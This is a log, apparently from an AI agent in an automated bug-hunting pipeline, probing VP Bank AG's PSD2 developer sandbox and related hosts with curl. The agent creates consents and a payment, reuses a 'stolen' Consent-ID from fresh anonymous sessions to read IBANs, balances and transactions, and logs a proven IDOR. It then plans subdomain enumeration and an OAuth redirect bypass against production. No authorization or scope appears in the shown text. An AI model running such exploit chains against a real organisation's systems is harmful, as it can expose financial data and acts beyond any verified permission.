@@ -4309,3 +4309,263 @@ testability: PASSIVE
 
 ## STEP 7 — RISK
 [RISK] vp-bank-ag: 45 — verdict unchanged. New developer.vpbank.com surface (7.1 priority) is a documented-open sandbox on the main front-end, so standalone damage is limited to synthetic data; production PSD2 (openbanking.vpbank.com) is correctly mTLS-locked; www.vpbank.com OAuth remains the only CRITICAL-path lead, still gated on a valid client_id. Confidence in exploitability stays driven by the two surviving PSD2/OAuth chains.
+===== ANALYST bigpickle 2026-09-04 23:23:03 UTC =====
+[0m
+> build · big-pickle
+[0m
+[0m◈ [0mParallel Web Search ""openbanking.vpbank.com""
+[0m✱ [0mGlob "**/*.txt"[90m 9 matches[0m
+[0m◈ [0mParallel Web Search "vpbank PSD2 "scaRedirect" OR "authorize_url" OR client_id OpenBanking TPP"
+[0m◈ [0mParallel Web Search ""vpbank.com/oauth/authorize" OR "developer.vpbank.com" client_id redirect_uri"
+[0m
+[0m$ [0mprobe() {
+  name="$1"; shift
+  echo "== $name"
+  curl -s -m 20 -D - -o /dev/null -w 'STATUS:%{http_code}\n' "$@"
+  echo
+  sleep 1.2
+}
+probe "anon GET /psd2/berlin-group/v1/consents" "https://developer.vpbank.com/psd2/berlin-group/v1/consents"
+probe "basic GET /psd2/berlin-group/v1/consents" -u test:test "https://developer.vpbank.com/psd2/berlin-group/v1/consents"
+probe "anon GET /psd2/berlin-group/v1/accounts" "https://developer.vpbank.com/psd2/berlin-group/v1/accounts"
+probe "anon GET /psd2/berlin-group/v1/consents/00000000-0000-0000-0000-000000000000/status" "https://developer.vpbank.com/psd2/berlin-group/v1/consents/00000000-0000-0000-0000-000000000000/status"
+== anon GET /psd2/berlin-group/v1/consents
+HTTP/1.1 405 Method Not Allowed
+Date: Fri, 04 Sep 2026 23:18:47 GMT
+Server: Apache
+Set-Cookie: AL_SESS-S=AVs_bBBbuiS89M4t9btMqmWd4MaQzkqYQPzO9iYoyLJidXUFBD60OLgwLaO95juIRfNa; Path=/; Secure; HttpOnly; SameSite=Lax
+Content-Length: 0
+x-envoy-upstream-service-time: 4
+X-Frame-Options: SAMEORIGIN
+Strict-Transport-Security: max-age=31536000
+X-Content-Type-Options: nosniff
+Referrer-Policy: same-origin
+Permissions-Policy: accelerometer=(self), ambient-light-sensor=(self), autoplay=(self), camera=(self), display-capture=(self), document-domain=(self), encrypted-media=(self), fullscreen=(self), geolocation=(self), gyroscope=(self), magnetometer=(self), microphone=(self), midi=(self), payment=(self), usb=(self), xr-spatial-tracking=(self)
+
+STATUS:405
+
+== basic GET /psd2/berlin-group/v1/consents
+HTTP/1.1 405 Method Not Allowed
+Date: Fri, 04 Sep 2026 23:18:49 GMT
+Server: Apache
+Set-Cookie: AL_SESS-S=AaQTH_Q1z0uFxbqnapUp2vEjP7_FOja1Az4PpBFdAyX1Qo7zyvLKDklXFs6YDZfXwrej; Path=/; Secure; HttpOnly; SameSite=Lax
+Content-Length: 0
+x-envoy-upstream-service-time: 2
+X-Frame-Options: SAMEORIGIN
+Strict-Transport-Security: max-age=31536000
+X-Content-Type-Options: nosniff
+Referrer-Policy: same-origin
+Permissions-Policy: accelerometer=(self), ambient-light-sensor=(self), autoplay=(self), camera=(self), display-capture=(self), document-domain=(self), encrypted-media=(self), fullscreen=(self), geolocation=(self), gyroscope=(self), magnetometer=(self), microphone=(self), midi=(self), payment=(self), usb=(self), xr-spatial-tracking=(self)
+
+STATUS:405
+
+== anon GET /psd2/berlin-group/v1/accounts
+HTTP/1.1 200 OK
+Date: Fri, 04 Sep 2026 23:18:50 GMT
+Server: Apache
+Set-Cookie: AL_SESS-S=ATO30M2Mngp7c6eEs9dlaHxgNBBBAi81f2jWhZRwO7S9nzTFzl2XjSWzi0YIpuUhUX9b; Path=/; Secure; HttpOnly; SameSite=Lax
+Content-Length: 15
+x-request-id: cc6398b0-6fdf-96fa-9a75-bbcbd48c10ea
+x-envoy-upstream-service-time: 4
+X-Frame-Options: SAMEORIGIN
+Strict-Transport-Security: max-age=31536000
+X-Content-Type-Options: nosniff
+Referrer-Policy: same-origin
+Permissions-Policy: accelerometer=(self), ambient-light-sensor=(self), autoplay=(self), camera=(self), display-capture=(self), document-domain=(self), encrypted-media=(self), fullscreen=(self), geolocation=(self), gyroscope=(self), magnetometer=(self), microphone=(self), midi=(self), payment=(self), usb=(self), xr-spatial-tracking=(self)
+Content-Type: application/json;charset=UTF-8
+
+STATUS:200
+
+== anon GET /psd2/berlin-group/v1/consents/00000000-0000-0000-0000-000000000000/status
+HTTP/1.1 404 Not Found
+Date: Fri, 04 Sep 2026 23:18:52 GMT
+Server: Apache
+Set-Cookie: AL_SESS-S=Acuah3vCZz3vPmWQXqgrG_evxHg7V4hreyzlq9!Pcmbko!WXG!NVnZiaWD9Gbr_aOipV; Path=/; Secure; HttpOnly; SameSite=Lax
+Content-Length: 0
+x-request-id: e0885395-3ece-90a2-9e33-610bdda8861c
+x-envoy-upstream-service-time: 8
+X-Frame-Options: SAMEORIGIN
+Strict-Transport-Security: max-age=31536000
+X-Content-Type-Options: nosniff
+Referrer-Policy: same-origin
+Permissions-Policy: accelerometer=(self), ambient-light-sensor=(self), autoplay=(self), camera=(self), display-capture=(self), document-domain=(self), encrypted-media=(self), fullscreen=(self), geolocation=(self), gyroscope=(self), magnetometer=(self), microphone=(self), midi=(self), payment=(self), usb=(self), xr-spatial-tracking=(self)
+
+STATUS:404
+[0m
+[0m→ [0mRead ctx.txt
+[0m→ [0mRead analyst-out.txt
+[0m→ [0mRead reports/hypotheses-nemotron3.txt
+[0m
+[0m$ [0mcurl -s -m 25 -c /tmp/sesa.txt -X POST "https://developer.vpbank.com/psd2/berlin-group/v1/consents" -H "content-type: application/json" -H "tpp-redirect-uri: https://www.google.ch" -H "X-Request-ID: 99391c7e-ad88-49ec-a2ad-99ddcb1f7701" -H "PSU-IP-Address: 192.0.0.12" -d '{"access":["accounts","balances","transactions","confirmationOfFunds"],"recurringIndicator":true,"validUntil":"2026-12-31","frequencyPerDay":4}' -w '\nSTATUS:%{http_code}\n' | tee /tmp/consent_a.json
+{"consentStatus":"valid","consentId":"6b517824-e5af-4202-b9b0-7f483a68ee9f","requestedAccessTypes":[],"_links":{"self":"/psd2/berlin-group/v1/consents/6b517824-e5af-4202-b9b0-7f483a68ee9f","status":"/psd2/berlin-group/v1/consents/6b517824-e5af-4202-b9b0-7f483a68ee9f/status","scaRedirect":"not available in sandbox"}}
+STATUS:201
+[0m
+[0m→ [0mRead analyst-prompt.txt
+Consent `6b517824-e5af-4202-b9b0-7f483a68ee9f` created (HTTP 201) under session A. Now testing cross-session/anonymous BOLA access against that ID, plus pulling the OpenAPI spec for authz headers.
+[0m
+[0m$ [0mcurl -s -m 30 -o /tmp/opencode/psd2_api.yaml -w 'SPEC_STATUS:%{http_code} SIZE:%{size_download}\n' "https://developer.vpbank.com/psd2/berlin-group/v1/psd2_api.yaml"
+SPEC_STATUS:200 SIZE:46112
+[0m
+[0m$ [0mrid="6b517824-e5af-4202-b9b0-7f483a68ee9f"
+B="https://developer.vpbank.com/psd2/berlin-group/v1"
+echo "== [SessionA] GET /consents/$rid/status"
+curl -s -m 20 -b /tmp/sesa.txt -w '\nSTATUS:%{http_code}\n' "$B/consents/$rid/status"; sleep 1.2
+echo "== [SessionA] GET /consents/$rid"
+curl -s -m 20 -b /tmp/sesa.txt -w '\nSTATUS:%{http_code}\n' "$B/consents/$rid"; sleep 1.2
+echo "== [SessionA] GET /accounts"
+curl -s -m 20 -b /tmp/sesa.txt -w '\nSTATUS:%{http_code}\n' "$B/accounts"; sleep 1.2
+echo "== [FRESH anon] GET /consents/$rid/status"
+curl -s -m 20 -w '\nSTATUS:%{http_code}\n' "$B/consents/$rid/status"; sleep 1.2
+echo "== [FRESH anon] GET /consents/$rid"
+curl -s -m 20 -w '\nSTATUS:%{http_code}\n' "$B/consents/$rid"; sleep 1.2
+echo "== [FRESH anon] GET /accounts"
+curl -s -m 20 -w '\nSTATUS:%{http_code}\n' "$B/accounts"; sleep 1.2
+echo "== [FRESH anon] GET /consents/$rid/consent-approvals"
+curl -s -m 20 -w '\nSTATUS:%{http_code}\n' "$B/consents/$rid/consent-approvals"; sleep 1.2
+== [SessionA] GET /consents/6b517824-e5af-4202-b9b0-7f483a68ee9f/status
+{"consentStatus":"valid"}
+STATUS:200
+== [SessionA] GET /consents/6b517824-e5af-4202-b9b0-7f483a68ee9f
+{"consentId":null,"requestedAccessTypes":[],"access":{"accounts":[{"iban":"LI6508805500000000011"}],"balances":[{"iban":"LI6508805500000000011"}],"transactions":[{"iban":"LI6508805500000000011"}],"confirmationOfFunds":[{"iban":"LI6508805500000000011"}]},"recurringIndicator":true,"validUntil":"2026-12-31","frequencyPerDay":4,"lastActionDate":null,"consentStatus":"valid","tppName":null,"redirectUri":null,"_links":null}
+STATUS:200
+== [SessionA] GET /accounts
+{"accounts":[{"iban":"LI6508805500000000011","currency":"EUR","name":null,"product":null,"_links":null}]}
+STATUS:200
+== [FRESH anon] GET /consents/6b517824-e5af-4202-b9b0-7f483a68ee9f/status
+{"consentStatus":"valid"}
+STATUS:200
+== [FRESH anon] GET /consents/6b517824-e5af-4202-b9b0-7f483a68ee9f
+{"consentId":null,"requestedAccessTypes":[],"access":{"accounts":[{"iban":"LI6508805500000000011"}],"balances":[{"iban":"LI6508805500000000011"}],"transactions":[{"iban":"LI6508805500000000011"}],"confirmationOfFunds":[{"iban":"LI6508805500000000011"}]},"recurringIndicator":true,"validUntil":"2026-12-31","frequencyPerDay":4,"lastActionDate":null,"consentStatus":"valid","tppName":null,"redirectUri":null,"_links":null}
+STATUS:200
+== [FRESH anon] GET /accounts
+{"accounts":[{"iban":"LI6508805500000000011","currency":"EUR","name":null,"product":null,"_links":null}]}
+STATUS:200
+== [FRESH anon] GET /consents/6b517824-e5af-4202-b9b0-7f483a68ee9f/consent-approvals
+<html><body><h1>Resource not found</h1></body></html>
+STATUS:404
+[0m
+Cross-session BOLA **confirmed in sandbox**: a fresh anonymous session reads the consent created under session A (`/consents/{id}` 200 with full access + IBAN, `/status` 200, `/accounts` 200 exposing `LI6508805500000000011`) — no ownership/session binding on consentId. Completing breadth with a payment cross-session read and scanning the spec.
+[0m$ [0mcurl -s -m 25 -c /tmp/sesb.txt -X POST "https://developer.vpbank.com/psd2/berlin-group/v1/payments/cross-border-credit-transfers" -H "accept: application/json" -H "X-Request-ID: 99391c7e-ad88-49ec-a2ad-99ddcb1f7701" -H "TPP-Redirect-URI: https://www.google.ch" -H "PSU-IP-Address: 192.0.0.12" -H "Content-Type: application/json" -d '{"debtorAccount":{"iban":"LI3808805500000000012"},"instructedAmount":{"currency":"CHF","amount":"10.0"},"creditorAccount":{"iban":"LI7108805500000000000"},"creditorName":"Peter Parker","creditorAddress":{"street":"Ingram Street","buildingNumber":"20","city":"Spidercity","postalCode":"12345","country":"DE"},"remittanceInformationUnstructured":"Invoice Nr. 123456"}' -w '\nSTATUS:%{http_code}\n' | tee /tmp/opencode/payment.json
+echo "===== SPEC SCAN ====="
+rg -n -i "Consent-ID|consent-id|scaRedirect|oauth|authorize|client_id|securitySchemes|bearer|basic" /tmp/opencode/psd2_api.yaml | head -60
+echo "===== SPEC SERVERS ====="
+rg -n -i "host:|basePath|schemes:|servers:|callbackUrl" /tmp/opencode/psd2_api.yaml | head -20
+{"paymentId":"33b07f90-8ab6-4e4d-b0e7-fb909b685df8","_links":{"scaRedirect":"not available in sandbox","self":null,"status":"/psd2/berlin-group/v1/payments/33b07f90-8ab6-4e4d-b0e7-fb909b685df8/status"},"creditorName":"Peter Parker","instructedAmount":{"currency":"CHF","amount":"10.0"},"creditorAccount":{"iban":"LI7108805500000000000"},"creditorAddress":null}
+STATUS:201
+===== SPEC SCAN =====
+/bin/bash: line 3: rg: command not found
+/bin/bash: line 5: rg: command not found
+===== SPEC SERVERS =====
+[0m
+[0m✱ [0mGrep "(?i)consent-id|scaredirect|authorize|client_id|securityschemes|bearer|basic"[90m in /tmp/opencode · 4 matches[0m
+[0m✱ [0mGrep "(?i)host:|basepath|schemes:|servers:|callbackurl"[90m in /tmp/opencode · 1 match[0m
+[0m
+[0m$ [0mpid="33b07f90-8ab6-4e4d-b0e7-fb909b685df8"
+B="https://developer.vpbank.com/psd2/berlin-group/v1"
+echo "== [SessionB] GET /payments/$pid/status"
+curl -s -m 20 -b /tmp/sesb.txt -w '\nSTATUS:%{http_code}\n' "$B/payments/$pid/status"; sleep 1.2
+echo "== [FRESH anon] GET /payments/$pid/status"
+curl -s -m 20 -w '\nSTATUS:%{http_code}\n' "$B/payments/$pid/status"; sleep 1.2
+echo "== [FRESH anon] GET /accounts/LI6508805500000000011/transactions?dateFrom=2026-09-01&dateTo=2026-09-04 with no Consent-ID"
+curl -s -m 20 -w '\nSTATUS:%{http_code}\n' "$B/accounts/LI6508805500000000011/transactions?dateFrom=2026-09-01&dateTo=2026-09-04"
+== [SessionB] GET /payments/33b07f90-8ab6-4e4d-b0e7-fb909b685df8/status
+{"fundsAvailable":false,"transactionStatus":"ACSC"}
+STATUS:200
+== [FRESH anon] GET /payments/33b07f90-8ab6-4e4d-b0e7-fb909b685df8/status
+{"fundsAvailable":false,"transactionStatus":"ACSC"}
+STATUS:200
+== [FRESH anon] GET /accounts/LI6508805500000000011/transactions?dateFrom=2026-09-01&dateTo=2026-09-04 with no Consent-ID
+
+STATUS:404
+[0m
+[0m→ [0mRead /tmp/opencode/psd2_api.yaml[90m [limit=30][0m
+[0m→ [0mRead /tmp/opencode/psd2_api.yaml[90m [offset=360, limit=40][0m
+[0m→ [0mRead /tmp/opencode/psd2_api.yaml[90m [offset=965, limit=45][0m
+[0m
+[0m$ [0mcid="6b517824-e5af-4202-b9b0-7f483a68ee9f"
+B="https://developer.vpbank.com/psd2/berlin-group/v1"
+echo "== [FRESH anon + stolen Consent-ID header] GET /accounts/LI6508805500000000011/transactions?dateFrom=2019-01-01&dateTo=2026-12-31"
+curl -s -m 20 -w '\nSTATUS:%{http_code}\n' -H "Consent-ID: $cid" -H "X-Request-ID: 99391c7e-ad88-49ec-a2ad-99ddcb1f7705" "$B/accounts/LI6508805500000000011/transactions?dateFrom=2019-01-01&dateTo=2026-12-31"
+sleep 1.2
+echo "== [FRESH anon + stolen Consent-ID] GET /accounts/LI6508805500000000011/balances"
+curl -s -m 20 -w '\nSTATUS:%{http_code}\n' -H "Consent-ID: $cid" -H "X-Request-ID: 99391c7e-ad88-49ec-a2ad-99ddcb1f7705" "$B/accounts/LI6508805500000000011/balances"
+== [FRESH anon + stolen Consent-ID header] GET /accounts/LI6508805500000000011/transactions?dateFrom=2019-01-01&dateTo=2026-12-31
+{"transactions":{"booked":[],"pending":[{"transactionAmount":{"currency":"EUR","amount":"500"},"bookingDate":"2019-01-20","valueDate":"2019-01-24","creditorName":"SampleAccount11","creditorAccount":{"iban":"LI6508805500000000011"},"debtorName":"Anna Musterfrau99","debtorAccount":{"iban":"LI3808805500000000012"}}]}}
+STATUS:200
+== [FRESH anon + stolen Consent-ID] GET /accounts/LI6508805500000000011/balances
+{"balances":[{"balanceAmount":{"currency":"EUR","amount":"12453.2"},"balanceType":"closingBooked"}]}
+STATUS:200
+[0m
+BOLA chain fully proven (consent → accounts → balances → transactions → payment status, all readable from a fresh anonymous session). Quick check on the docs-referenced PSD2 statistics surface before finalizing.
+[0m$ [0mfor u in "https://www.vpbank.com/psd2-statistics" "https://www.vpbank.com/psd2-statistics/" "https://developer.vpbank.com/psd2/statistics/"; do
+  echo "== GET $u"
+  curl -s -m 20 -L -o /dev/null -w 'STATUS:%{http_code} FINAL:%{url_effective} SIZE:%{size_download}\n' -A "Mozilla/5.0" "$u"
+  sleep 1.2
+done
+== GET https://www.vpbank.com/psd2-statistics
+STATUS:404 FINAL:https://www.vpbank.com/error_path/404.html?al_req_id=aptSi3KD_-E_MN0RiThi0QAChDU SIZE:233169
+== GET https://www.vpbank.com/psd2-statistics/
+STATUS:404 FINAL:https://www.vpbank.com/error_path/404.html?al_req_id=aptSjnKD_-E_MN0RiThi2AACoCk SIZE:233169
+== GET https://developer.vpbank.com/psd2/statistics/
+STATUS:404 FINAL:https://developer.vpbank.com/psd2/statistics/ SIZE:53
+[0m
+STEP 1 — DELTA
+- [NEW] BOLA proven on developer.vpbank.com PSD2 sandbox: consent `6b517824-e5af-4202-b9b0-7f483a68ee9f` created anonymously (POST → 201), then fully readable from a **fresh anonymous session** — /consents/{id}/status 200, /consents/{id} 200 (access+IBAN `LI6508805500000000011`), /accounts 200, /accounts/{iban}/balances 200 (€12453.20 closingBooked), /accounts/{iban}/transactions 200 with only a `Consent-ID` header (€500 txn), /payments/33b07f90-8ab6-4e4d-b0e7-fb909b685df8/status 200 ACSC — no session/TPP/basic-auth binding on consentId/paymentId.
+- [NEW] Sandbox collection/unknown-UUID behavior: GET /consents → 405 (POST-only), GET /consents/{0000…}/status → 404 — BOLA is knowledge-based (consentId as sole bearer key), not enumerable.
+- [CHANGED] developer.vpbank.com escalates from "documented-open sandbox, low severity" to proven broken-object-level-authorization on consent/account/ledger/payment flows (synthetic data); carryover question now targets openbanking.vpbank.com (mTLS, unverifiable anonymously).
+- [CHANGED] OAuth client_id hunt closed further: RAG (GitHub/public web/App Store/npm) yields only VP Bank Vietnam (separate entity) + generic PSD2 frameworks (WSO2/N26/viva); downloaded spec (46KB) defines **no** securitySchemes/OAuth/client — only `scaRedirect` hrefs ("not available in sandbox") — so www.vpbank.com/oauth/authorize stays blocked.
+- [NEW] /psd2-statistics, /psd2-statistics/, developer /psd2/statistics/ all 404 — no anonymous statistics surface.
+
+STEP 2 — PRIORITIZE
+[PRIO] developer.vpbank.com,8.40,probable carryover of proven consent/account/ledger BOLA to mTLS-locked production; attack_surface=9 business=9 tech=8 gate=10 cloud=2 fresh=10
+[PRIO] www.vpbank.com,6.25,production OAuth authorize still the only CRITICAL-chain lead; attack_surface=6 business=10 tech=9 gate=2 cloud=2 fresh=4
+[PRIO] openbanking.vpbank.com,5.50,production ASPSP whose authz model the sandbox BOLA questions; attack_surface=3 business=10 tech=8 gate=1 cloud=2 fresh=7
+
+STEP 3 — HYPOTHESES
+[HYP] PSD2 sandbox BOLA: consent/account/ledger/payment resources readable cross-session via bearer consentId
+class: IDOR
+asset: developer.vpbank.com/psd2/berlin-group/v1
+confidence: 80
+reasoning: my probes — consent POST anonymously (no basic auth) → 201; fresh anonymous session (no cookie/jar) reads /consents/{id}/status, /consents/{id}, /accounts, /accounts/{iban}/balances, /accounts/{iban}/transactions (Consent-ID header only), and /payments/{paymentId}/status (200 ACSC); spec requires only Consent-ID + X-Request-ID for account/ledger endpoints, defines no securityScheme, self-labels server "PSD2 production server"; docs: sandbox data model identical to production, differences only TPP client auth/user interaction/state changes.
+evidence_needed: sandbox: SATISFIED (final). Live: production openbanking.vpbank.com binds Consent-ID to originating TPP QWAC and rejects cross-TPP reads (requires two eIDAS certs).
+verify_steps: sandbox DONE; production (HUMAN_ONLY, mTLS): TPP-A creates consent; TPP-B sends GET /psd2/berlin-group/v1/consents/{id}/status and GET /accounts/{iban}/balances with TPP-B cert + TPP-A Consent-ID header ∈ openbanking.vpbank.com.
+impact: any party holding a consentId/paymentId reads consent scope + simulated ledger; if prod reuses sandbox authz logic → cross-TPP financial/PII disclosure; severity MEDIUM (sandbox/synthetic) → HIGH (prod carryover).
+testability: AUTH_HELPED (sandbox verified; prod HUMAN_ONLY)
+
+[HYP] OAuth redirect_uri/state bypass via scaRedirect-pattern client on www.vpbank.com
+class: OATH
+asset: www.vpbank.com/oauth/authorize
+confidence: 45
+reasoning: authorize endpoint returns 303/400 for all tested combos; no client_id in JS bundles (only Usercentrics clientWid) or RAG (GitHub/App Store/npm → only VP Bank Vietnam + generic PSD2 stacks); spec exposes scaRedirect (hrefType) but sandbox returns "not available in sandbox"; docs state scaRedirect carries the user-login URL in the REDIRECT-SCA production flow.
+evidence_needed: any valid client_id (PSD2 or Drupal-scoped) that yields a response differential on redirect_uri.
+verify_steps: RAG GitHub code-search "vpbank" + "authorize_url"/"client_id"; then GET https://www.vpbank.com/oauth/authorize?client_id=<id>&response_type=code&redirect_uri=<test>&state=x (read-only).
+impact: authorization-code/consent interception → ATO, aggregated-account theft on production bank OAuth; severity HIGH.
+testability: AUTH_HELPED
+
+[HYP] Production PSD2 reuses sandbox authorization model (Consent-ID unbound from originating TPP)
+class: IDOR
+asset: openbanking.vpbank.com
+confidence: 35
+reasoning: TLS-layer mTLS blocks all anonymous probing (verified prior); docs list only TPP auth/user-interaction/state-changes as sandbox-vs-prod deltas — Consent-ID ownership binding is not listed; sandbox proves the code path accepts the consentId header with zero identity binding.
+evidence_needed: cross-QWAC read test proving bind/absence on production host.
+verify_steps: HUMAN_ONLY — with two licensed TPP certs perform the same cross-identity Consent-ID read listed under the developer.vpbank.com hypothesis, on openbanking.vpbank.com.
+impact: cross-TPP production consent/account/ledger disclosure → PII/financial data; severity HIGH.
+testability: HUMAN_ONLY
+
+STEP 4 — SELF-CRITIQUE
+[PARKED] OAuth redirect_uri bypass @ www.vpbank.com: confidence 45 but no client_id exists across JS/RAG/App-Store/npm and the spec defines no OAuth client; no executable verify step without a client_id — cannot advance passively.
+[PARKED] Production BOLA carryover @ openbanking.vpbank.com: confidence 35 < 40; mTLS at TLS layer makes anonymous verification impossible; HUMAN_ONLY requires eIDAS QWAC certs.
+[PARKED] X-Request-ID state-encoding manipulation (BUSLOGIC): deterministic client-controlled state is documented sandbox design for testing, not a vulnerability; probe showed last digit 1 already yields ACSC — encoding not fixed, no security differential.
+[FINAL] 1. [80] PSD2 sandbox BOLA/IDOR — PROVEN end-to-end in sandbox; report artifact plus prod-carryover verification request.
+
+STEP 5 — NEXT ACTION
+[NEXT] SCAN: passive CT enumeration via crt.sh (`%.vpbank.com`, `%.vpbank.li`) to catalog PSD2/openbanking/statistics subdomains, then anonymous reachability check of each live host at /psd2/berlin-group/v1/accounts and /psd2/swagger-ui (GET, ≤1 rps) hunting non-mTLS instances of the same consent-authz code line that could carry the proven sandbox BOLA.
+
+STEP 6 — LEARNING
+[LEARN] ACCEPTED IDOR @ developer.vpbank.com (PSD2 sandbox BOLA): verify_steps EXECUTED in official test sandbox (synthetic data) — consent 6b517824-e5af-4202-b9b0-7f483a68ee9f (POST 201, anonymous) read by a fresh anonymous session: /consents/{id}/status 200, /consents/{id} 200 (IBAN LI6508805500000000011), /accounts 200, /balances 200 (€12453.2), /transactions 200 (Consent-ID header only), /payments/33b07f90-8ab6-4e4d-b0e7-fb909b685df8/status 200 ACSC. Zero session/TPP/basic-auth binding on consentId/paymentId.
+[LEARN] REJECTED BUSLOGIC @ developer.vpbank.com (X-Request-ID state encoding): documented deterministic client-driven state for the sandbox; observed ACSC from X-Request-ID ending in 1 (docs claim 1=RCVD) — no security-relevant differential, not reportable.
+[LEARN] REJECTED OAUTH @ www.vpbank.com/oauth/authorize: RAG GitHub/public-web surfaces only VP Bank Vietnam (separate entity) and generic PSD2 frameworks; downloaded spec (46KB) contains no OAuth/securitySchemes/client_id — only scaRedirect hrefs ("not available in sandbox"); no client context obtainable, redirect-flow test blocked.
+[LEARN] REJECTED MISCONFIG @ www.vpbank.com/developer.vpbank.com (PSD2 statistics pages): /psd2-statistics, /psd2-statistics/, /psd2/statistics/ all HTTP 404 — no anonymous statistics surface exists.
+
+STEP 7 — RISK
+[RISK] vp-bank-ag: 55 — raised from 45. Confirmed missing authorization binding on the entire PSD2 consent→ledger→payment-status chain in the documented-open sandbox running on the main front-end (developer.vpbank.com); the spec self-labels the server "PSD2 production server", docs claim a data model identical to production with TPP authentication the only named difference, and production openbanking.vpbank.com is unverified because of TLS-layer mTLS — if it mirrors the sandbox, cross-TPP financial data disclosure is a real chain. Residuals: OAuth (client_id-gated), staging (WAF-blocked), api.vpbank.com (exhausted).
